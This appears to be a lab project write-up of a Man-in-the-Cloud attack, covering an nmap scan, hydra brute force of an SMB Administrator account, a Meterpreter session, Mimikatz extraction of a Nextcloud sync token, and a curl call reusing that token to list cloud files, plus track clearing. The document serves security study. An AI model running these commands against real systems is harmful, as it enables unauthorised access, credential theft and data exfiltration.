# 4. Penetration Testing

This section documents the exploitation phase of the project. The objective was to compromise the Windows client, extract the Nextcloud synchronisation token, and perform a full Man-in-the-Cloud (MitC) attack.

The workflow followed structured offensive testing stages: reconnaissance, initial access, post-exploitation, token extraction, and cloud data exfiltration.

---

## 4.1 Reconnaissance and Service Enumeration

Initial scanning identified exposed services and potential entry points.

```bash
nmap -sV -p- 192.168.1.10
```

### Findings
- SMB (port 445) exposed
- Local usernames identified, including **Administrator**
- Service version information revealed

This confirmed SMB as a viable initial access vector.

---

## 4.2 Credential Brute Force (Initial Access)

Using the discovered Administrator username, a brute-force attack was performed against the SMB service using a common password list.

```bash
hydra -l Administrator -P passwords.txt smb://192.168.1.10
```

### Outcome
- Weak password successfully cracked
- Valid SMB credentials obtained
- Remote authentication confirmed

### Evidence â€“ Successful Credential Compromise and Extraction

<img width="602" height="532" alt="image" src="https://github.com/user-attachments/assets/421eb9ca-6073-4581-afc7-78e173b4b47f" />

<img width="602" height="532" alt="image" src="https://github.com/user-attachments/assets/4bcce7e5-88ad-4d6d-8cd3-2aa6cb64f26b" />

---

## 4.3 Remote Exploitation with Msfconsole

With valid credentials established, exploitation was escalated using Metasploit.

### Actions Performed
- Meterpreter session established
- Remote shell access confirmed
- Post-exploitation tools prepared for upload

### Evidence â€“ Meterpreter Session Established

<img width="617" height="579" alt="image" src="https://github.com/user-attachments/assets/ed5443c2-5cd7-4cd4-9dff-2d3b6db4ca84" />


This provided controlled remote access to the Windows client.

---

## 4.4 Token Discovery â€“ Iteration 1

Before automating extraction, multiple methods were tested to locate the synchronisation token:

- Searching configuration directories
- Reviewing application data folders
- Inspecting system logs

The token was ultimately identified within Windows Credential Manager, confirming that token-based authentication was exposed at the endpoint.

This validated the feasibility of a MitC attack path.

---

## 4.5 Mimikatz Token Extraction â€“ Iteration 2 (Successful)

To automate credential and token extraction, Mimikatz was uploaded to the compromised client via the active Meterpreter session.

### Key Actions
- Uploaded Mimikatz executable from attacker VM
- Executed tool remotely
- Extracted stored credentials and synchronisation token
- Retrieved token in hexadecimal format

### ðŸ“¸ Evidence â€“ Mimikatz Revealing Synchronisation Token
```
![Mimikatz Token Dump](images/mimikatz-token-dump.png)
```

---

## 4.6 Token Decoding

The extracted token appeared in hexadecimal format and required decoding before use.

```bash
echo <HEX_TOKEN> | xxd -r -p
```

This revealed the usable Nextcloud synchronisation token.

### ðŸ“¸ Evidence â€“ Token Decoded in Terminal
```
![Token Decoded](images/token-decoded.png)
```

---

## 4.7 MitC Execution â€“ Cloud Access and Data Extraction

The decoded token was used to authenticate directly against the Nextcloud API, bypassing standard login procedures.

```bash
curl -u "Administrator:<TOKEN>" https://<server>/remote.php/dav/files
```

### Result
- Direct access to cloud storage
- File listing successful
- No password re-entry required
- Authentication controls bypassed

### ðŸ“¸ Evidence â€“ Cloud Storage Access via Token
```
![Cloud Data Exfiltration](images/cloud-data-access.png)
```

This demonstrates MITRE ATT&CK technique **T1528 â€“ Steal Application Access Token**, forming the basis of the MitC compromise.

---

## 4.8 Clearing Tracks

To complete the exploitation cycle:

- Meterpreter session terminated
- Uploaded tools removed
- Temporary files deleted

This simulated responsible session closure and trace reduction.

---

## 4.9 Summary and Outcome

The penetration testing phase successfully achieved the primary project objective:

- Identified exposed SMB service
- Discovered Administrator account via enumeration
- Brute-forced weak credentials
- Gained authenticated remote access
- Uploaded and executed Mimikatz
- Extracted and decoded the synchronisation token
- Used the token to access and extract cloud data
- Bypassed authentication controls entirely

The Man-in-the-Cloud (MitC) attack was fully replicated in a controlled lab environment, demonstrating how weak identity controls and exposed token storage can result in complete cloud compromise.
